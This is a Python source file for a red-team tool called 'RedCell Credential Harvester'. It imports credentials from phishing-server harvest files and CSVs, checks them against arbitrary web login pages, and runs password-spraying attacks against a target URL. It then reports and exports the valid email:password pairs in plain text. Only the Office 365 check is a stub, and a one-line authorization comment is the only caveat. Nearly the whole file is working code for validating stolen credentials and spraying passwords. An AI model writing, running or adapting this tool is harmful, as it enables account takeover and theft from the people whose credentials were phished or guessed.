"""
Credential Harvesting and Validation Module

Tools for processing, validating, and utilizing harvested credentials.
"""

import requests
import json
import csv
from typing import List, Dict, Optional, Tuple
from datetime import datetime
import time
import re
from dataclasses import dataclass, asdict


@dataclass
class Credential:
    """Represents a harvested credential."""
    email: str
    password: str
    username: Optional[str] = None
    source: Optional[str] = None
    timestamp: Optional[str] = None
    valid: Optional[bool] = None
    validated_at: Optional[str] = None
    metadata: Optional[Dict] = None

    def to_dict(self) -> Dict:
        """Convert to dictionary."""
        return asdict(self)


class CredentialHarvester:
    """
    Credential harvesting and validation framework.

    Features:
    - Credential storage and management
    - Validation against various services
    - Password spraying capabilities
    - Credential analytics
    - Export to multiple formats
    """

    def __init__(self, storage_file: str = 'credentials.json'):
        """
        Initialize credential harvester.

        Args:
            storage_file: File to store credentials
        """
        self.storage_file = storage_file
        self.credentials: List[Credential] = []
        self._load_credentials()

    def _load_credentials(self):
        """Load credentials from storage file."""
        try:
            if os.path.exists(self.storage_file):
                with open(self.storage_file, 'r') as f:
                    data = json.load(f)
                    self.credentials = [Credential(**cred) for cred in data]
        except Exception as e:
            print(f"[-] Error loading credentials: {e}")
            self.credentials = []

    def _save_credentials(self):
        """Save credentials to storage file."""
        try:
            with open(self.storage_file, 'w') as f:
                json.dump([cred.to_dict() for cred in self.credentials],
                         f, indent=2)
        except Exception as e:
            print(f"[-] Error saving credentials: {e}")

    def add_credential(
        self,
        email: str,
        password: str,
        username: Optional[str] = None,
        source: Optional[str] = None,
        metadata: Optional[Dict] = None
    ) -> Credential:
        """
        Add a credential to the collection.

        Args:
            email: Email address
            password: Password
            username: Username (optional)
            source: Source of credential
            metadata: Additional metadata

        Returns:
            Created Credential object
        """
        cred = Credential(
            email=email,
            password=password,
            username=username,
            source=source,
            timestamp=datetime.now().isoformat(),
            metadata=metadata
        )

        self.credentials.append(cred)
        self._save_credentials()

        return cred

    def import_from_phishing(self, phishing_file: str) -> int:
        """
        Import credentials from phishing server harvest file.

        Args:
            phishing_file: Path to phishing harvest file

        Returns:
            Number of credentials imported
        """
        count = 0

        try:
            with open(phishing_file, 'r') as f:
                phishing_data = json.load(f)

            for entry in phishing_data:
                if entry.get('email') and entry.get('password'):
                    self.add_credential(
                        email=entry['email'],
                        password=entry['password'],
                        username=entry.get('username'),
                        source=f"phishing_{entry.get('type', 'unknown')}",
                        metadata={
                            'ip_address': entry.get('ip_address'),
                            'user_agent': entry.get('user_agent'),
                            'timestamp': entry.get('timestamp')
                        }
                    )
                    count += 1

            print(f"[+] Imported {count} credentials from phishing harvest")

        except Exception as e:
            print(f"[-] Error importing from phishing file: {e}")

        return count

    def import_from_csv(self, csv_file: str) -> int:
        """
        Import credentials from CSV file.

        CSV format: email,password,username (optional)

        Args:
            csv_file: Path to CSV file

        Returns:
            Number of credentials imported
        """
        count = 0

        try:
            with open(csv_file, 'r') as f:
                reader = csv.DictReader(f)

                for row in reader:
                    if row.get('email') and row.get('password'):
                        self.add_credential(
                            email=row['email'],
                            password=row['password'],
                            username=row.get('username'),
                            source='csv_import'
                        )
                        count += 1

            print(f"[+] Imported {count} credentials from CSV")

        except Exception as e:
            print(f"[-] Error importing from CSV: {e}")

        return count

    def validate_office365(self, email: str, password: str) -> bool:
        """
        Validate Office 365 credentials.

        Args:
            email: Email address
            password: Password

        Returns:
            True if valid, False otherwise
        """
        # This is a placeholder - actual validation would use Microsoft Graph API
        # or similar authentication endpoint
        # IMPORTANT: Only use with proper authorization

        print(f"[*] Validating Office 365 credentials for {email}")

        # In a real scenario, you would make an API call to validate
        # For this educational example, we'll simulate the validation
        # return self._test_auth_endpoint(
        #     'https://login.microsoftonline.com/common/oauth2/token',
        #     email,
        #     password
        # )

        return False  # Placeholder

    def validate_generic_web(
        self,
        url: str,
        email: str,
        password: str,
        email_field: str = 'email',
        password_field: str = 'password'
    ) -> bool:
        """
        Validate credentials against generic web login.

        Args:
            url: Login URL
            email: Email address
            password: Password
            email_field: Name of email field
            password_field: Name of password field

        Returns:
            True if valid, False otherwise
        """
        try:
            session = requests.Session()
            response = session.post(
                url,
                data={
                    email_field: email,
                    password_field: password
                },
                timeout=10,
                allow_redirects=False
            )

            # Check for success indicators
            success_indicators = [
                response.status_code in [200, 302],
                'dashboard' in response.text.lower(),
                'welcome' in response.text.lower(),
                'logout' in response.text.lower(),
                'set-cookie' in str(response.headers).lower()
            ]

            return any(success_indicators)

        except Exception as e:
            print(f"[-] Error validating credentials: {e}")
            return False

    def validate_credentials(
        self,
        validation_url: Optional[str] = None,
        validation_type: str = 'generic'
    ):
        """
        Validate all stored credentials.

        Args:
            validation_url: URL for validation (for generic type)
            validation_type: Type of validation (office365, generic)
        """
        print(f"[*] Validating {len(self.credentials)} credentials...")

        for cred in self.credentials:
            if cred.valid is not None:
                continue  # Already validated

            try:
                if validation_type == 'office365':
                    valid = self.validate_office365(cred.email, cred.password)
                elif validation_type == 'generic' and validation_url:
                    valid = self.validate_generic_web(
                        validation_url,
                        cred.email,
                        cred.password
                    )
                else:
                    print("[-] Invalid validation type or missing URL")
                    continue

                cred.valid = valid
                cred.validated_at = datetime.now().isoformat()

                if valid:
                    print(f"[+] Valid: {cred.email}")
                else:
                    print(f"[-] Invalid: {cred.email}")

                time.sleep(1)  # Rate limiting

            except Exception as e:
                print(f"[-] Error validating {cred.email}: {e}")

        self._save_credentials()

    def password_spray(
        self,
        target_url: str,
        usernames: List[str],
        passwords: List[str],
        delay: int = 30,
        email_field: str = 'email',
        password_field: str = 'password'
    ) -> List[Tuple[str, str]]:
        """
        Perform password spraying attack.

        Args:
            target_url: Target login URL
            usernames: List of usernames/emails
            passwords: List of passwords to try
            delay: Delay between attempts (seconds)
            email_field: Email field name
            password_field: Password field name

        Returns:
            List of valid (username, password) tuples
        """
        print(f"[*] Starting password spray against {target_url}")
        print(f"[*] Testing {len(usernames)} users with {len(passwords)} passwords")
        print(f"[*] Delay between attempts: {delay}s")

        valid_creds = []

        for password in passwords:
            print(f"\n[*] Trying password: {password}")

            for username in usernames:
                print(f"    Testing {username}...", end=' ')

                if self.validate_generic_web(
                    target_url,
                    username,
                    password,
                    email_field,
                    password_field
                ):
                    print("SUCCESS!")
                    valid_creds.append((username, password))

                    # Add to credential store
                    self.add_credential(
                        email=username,
                        password=password,
                        source='password_spray',
                        metadata={'target': target_url}
                    )
                else:
                    print("failed")

                time.sleep(2)  # Small delay between users

            # Delay between password attempts
            if password != passwords[-1]:
                print(f"\n[*] Waiting {delay}s before next password...")
                time.sleep(delay)

        print(f"\n[+] Password spray complete!")
        print(f"[+] Found {len(valid_creds)} valid credentials")

        return valid_creds

    def get_valid_credentials(self) -> List[Credential]:
        """
        Get all validated credentials.

        Returns:
            List of valid Credential objects
        """
        return [cred for cred in self.credentials if cred.valid is True]

    def get_statistics(self) -> Dict:
        """
        Get credential statistics.

        Returns:
            Dictionary of statistics
        """
        total = len(self.credentials)
        validated = len([c for c in self.credentials if c.valid is not None])
        valid = len([c for c in self.credentials if c.valid is True])

        sources = {}
        for cred in self.credentials:
            source = cred.source or 'unknown'
            sources[source] = sources.get(source, 0) + 1

        return {
            'total_credentials': total,
            'validated': validated,
            'valid': valid,
            'invalid': validated - valid,
            'pending_validation': total - validated,
            'sources': sources,
            'success_rate': (valid / validated * 100) if validated > 0 else 0
        }

    def generate_report(self) -> str:
        """
        Generate credential harvest report.

        Returns:
            Formatted report string
        """
        stats = self.get_statistics()

        report = []
        report.append("=" * 60)
        report.append("CREDENTIAL HARVEST REPORT")
        report.append("=" * 60)
        report.append("")
        report.append(f"Total Credentials: {stats['total_credentials']}")
        report.append(f"Validated: {stats['validated']}")
        report.append(f"Valid: {stats['valid']}")
        report.append(f"Invalid: {stats['invalid']}")
        report.append(f"Pending: {stats['pending_validation']}")
        report.append(f"Success Rate: {stats['success_rate']:.1f}%")
        report.append("")

        report.append("Sources:")
        for source, count in stats['sources'].items():
            report.append(f"  {source}: {count}")
        report.append("")

        # List valid credentials
        valid_creds = self.get_valid_credentials()
        if valid_creds:
            report.append("Valid Credentials:")
            report.append("-" * 60)
            for cred in valid_creds:
                report.append(f"  {cred.email}:{cred.password}")
                if cred.source:
                    report.append(f"    Source: {cred.source}")
            report.append("")

        report.append("=" * 60)

        return "\n".join(report)

    def export_to_csv(self, output_file: str, valid_only: bool = False):
        """
        Export credentials to CSV.

        Args:
            output_file: Output file path
            valid_only: Export only valid credentials
        """
        creds = self.get_valid_credentials() if valid_only else self.credentials

        with open(output_file, 'w', newline='') as f:
            fieldnames = ['email', 'password', 'username', 'source',
                         'valid', 'timestamp', 'validated_at']
            writer = csv.DictWriter(f, fieldnames=fieldnames)

            writer.writeheader()
            for cred in creds:
                writer.writerow({
                    'email': cred.email,
                    'password': cred.password,
                    'username': cred.username or '',
                    'source': cred.source or '',
                    'valid': cred.valid if cred.valid is not None else '',
                    'timestamp': cred.timestamp or '',
                    'validated_at': cred.validated_at or ''
                })

        print(f"[+] Exported {len(creds)} credentials to {output_file}")

    def export_to_json(self, output_file: str, valid_only: bool = False):
        """
        Export credentials to JSON.

        Args:
            output_file: Output file path
            valid_only: Export only valid credentials
        """
        creds = self.get_valid_credentials() if valid_only else self.credentials

        with open(output_file, 'w') as f:
            json.dump([cred.to_dict() for cred in creds], f, indent=2)

        print(f"[+] Exported {len(creds)} credentials to {output_file}")


def main():
    """Main function for standalone usage."""
    import argparse
    import os

    parser = argparse.ArgumentParser(description='RedCell Credential Harvester')
    parser.add_argument('--import-phishing', help='Import from phishing harvest file')
    parser.add_argument('--import-csv', help='Import from CSV file')
    parser.add_argument('--validate', help='Validate credentials against URL')
    parser.add_argument('--spray', help='Password spray against URL')
    parser.add_argument('--usernames', help='File containing usernames for spraying')
    parser.add_argument('--passwords', help='File containing passwords for spraying')
    parser.add_argument('--report', action='store_true', help='Generate report')
    parser.add_argument('--export-csv', help='Export to CSV file')
    parser.add_argument('--export-json', help='Export to JSON file')
    parser.add_argument('--valid-only', action='store_true',
                       help='Export only valid credentials')
    parser.add_argument('--storage', default='credentials.json',
                       help='Credential storage file')

    args = parser.parse_args()

    harvester = CredentialHarvester(storage_file=args.storage)

    # Import operations
    if args.import_phishing:
        harvester.import_from_phishing(args.import_phishing)

    if args.import_csv:
        harvester.import_from_csv(args.import_csv)

    # Validation
    if args.validate:
        harvester.validate_credentials(
            validation_url=args.validate,
            validation_type='generic'
        )

    # Password spraying
    if args.spray and args.usernames and args.passwords:
        with open(args.usernames) as f:
            usernames = [line.strip() for line in f if line.strip()]

        with open(args.passwords) as f:
            passwords = [line.strip() for line in f if line.strip()]

        harvester.password_spray(args.spray, usernames, passwords)

    # Reporting
    if args.report:
        print(harvester.generate_report())

    # Export
    if args.export_csv:
        harvester.export_to_csv(args.export_csv, args.valid_only)

    if args.export_json:
        harvester.export_to_json(args.export_json, args.valid_only)


if __name__ == '__main__':
    main()
